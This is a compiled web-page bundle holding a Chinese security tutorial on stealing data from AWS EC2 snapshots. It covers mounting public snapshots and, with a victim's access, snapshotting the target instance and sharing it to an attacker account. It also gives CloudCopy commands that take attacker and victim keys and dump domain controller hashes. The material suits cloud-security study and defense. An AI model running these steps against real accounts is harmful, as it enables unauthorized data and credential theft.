(window.webpackJsonp=window.webpackJsonp||[]).push([[31],{821:function(s,t,a){"use strict";a.r(t);var n=a(112),e=Object(n.a)({},(function(){var s=this,t=s.$createElement,a=s._self._c||t;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("center",[a("h1",[s._v("获取共享快照内的数据")])]),s._v(" "),a("hr"),s._v(" "),a("h2",{attrs:{id:"前言"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#前言"}},[s._v("#")]),s._v(" 前言")]),s._v(" "),a("p",[s._v("如果当前凭证具有 EC2:CreateSnapshot 权限的话，可以通过创建共享快照的方式，然后将自己 aws 控制台下的实例挂载由该快照生成的卷，从而获取到目标 EC2 中的内容。")]),s._v(" "),a("h2",{attrs:{id:"公有快照"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#公有快照"}},[s._v("#")]),s._v(" 公有快照")]),s._v(" "),a("p",[s._v("这里以公有快照作为示例。")]),s._v(" "),a("br"),s._v(" "),a("p",[a("img",{attrs:{width:"1200",src:"/img/1650001031.png"}}),a("br")]),s._v(" "),a("p",[s._v("这里随便找一个快照，点击创建卷，卷的大小需要大于或等于快照大小，这里创建一个 20G 大小的卷，另外可用区需要和自己的 EC2 保持一致，最后快照 ID 指定刚才随便找的快照")]),s._v(" "),a("br"),s._v(" "),a("p",[a("img",{attrs:{width:"800",src:"/img/1650001064.png"}}),a("br")]),s._v(" "),a("p",[s._v("将刚创建的卷挂载到自己的实例中")]),s._v(" "),a("br"),s._v(" "),a("p",[a("img",{attrs:{width:"800",src:"/img/1650001090.png"}}),a("br")]),s._v(" "),a("p",[s._v("登录到自己的实例，查看刚才添加卷的名称")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("fdisk")]),s._v(" -l\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("br"),s._v(" "),a("p",[a("img",{attrs:{width:"600",src:"/img/1650001092.png"}}),a("br")]),s._v(" "),a("p",[s._v("通过大小可以判断出来 /dev/xvdf 是刚才刚才添加的卷，然后将这个卷挂载到实例中，通过 ls 就可以看到这个公有快照中的数据了。")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mkdir")]),s._v(" /test\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mount")]),s._v(" /dev/xvdf3 /test\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ls")]),s._v(" /test\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("br"),s._v(" "),a("p",[a("img",{attrs:{width:"800",src:"/img/1650001117.png"}}),a("br")]),s._v(" "),a("h2",{attrs:{id:"私有快照"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#私有快照"}},[s._v("#")]),s._v(" 私有快照")]),s._v(" "),a("p",[s._v("在拿到目标 AWS 控制台权限时，如果无法登录到实例，可以为目标实例打个快照，然后将快照共享给自己。")]),s._v(" "),a("br"),s._v(" "),a("p",[a("img",{attrs:{width:"800",src:"/img/1650001136.png"}}),a("br")]),s._v(" "),a("p",[s._v("将自己的账\t号 ID 添加到快照共享后，在自己的 AWS 快照控制台的私有快照处就能看到目标快照了，此时就可以将其挂载到自己的实例，查看里面的数据了。")]),s._v(" "),a("br"),s._v(" "),a("p",[a("img",{attrs:{width:"800",src:"/img/1650001161.png"}}),a("br")]),s._v(" "),a("p",[s._v("目前也已经有了自动化工具了，CloudCopy 可以通过提供的访问凭证自动实现创建实例快照、自动挂载快照等操作")]),s._v(" "),a("p",[s._v("不过 CloudCopy 默认只会获取实例中的域成员哈希值，也就是说前提目标实例是一个域控，不过将这个工具稍微加以修改，就可以获取到其他的文件了，下面来看下这个工具的使用。")]),s._v(" "),a("p",[s._v("获取 CloudCopy 工具")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("git")]),s._v(" clone https://github.com/Static-Flow/CloudCopy.git\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("cd")]),s._v(" CloudCopy\npython3 CloudCopy.py\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("blockquote",[a("p",[s._v("如果运行报错，一般是因为第三方库缺失，根据提示安装对应模块即可")])]),s._v(" "),a("p",[s._v("接下来，开始进行相应的配置，输入自己的 AWS 账号 ID 及访问凭证以及目标的访问凭证")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("manual_cloudcopy\nshow_options\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" attackeraccountid xxx\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" attackerAccessKey xxx\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" attackerSecretKey xxx\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" victimAccessKey xxx\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" victimSecretKey xxx\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" region ap-northeast-2\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br")])]),a("br"),s._v(" "),a("p",[a("img",{attrs:{width:"800",src:"/img/1650001184.png"}}),a("br")]),s._v(" "),a("p",[s._v("配置好之后，就可以利用 CloudCopy 进行哈希窃取了")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("stealDCHashes\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("这时会提示选择实例，直接输入要窃取的实例编号即可")]),s._v(" "),a("br"),s._v(" "),a("p",[a("img",{attrs:{width:"800",src:"/img/1650001208.png"}}),a("br")]),s._v(" "),a("p",[s._v("等待一段时间，就可以看到已经读到 DC 的哈希了。")]),s._v(" "),a("br"),s._v(" "),a("p",[a("img",{attrs:{width:"1000",src:"/img/1650001226.png"}}),a("br")]),s._v(" "),a("Vssue")],1)}),[],!1,null,null,null);t.default=e.exports}}]);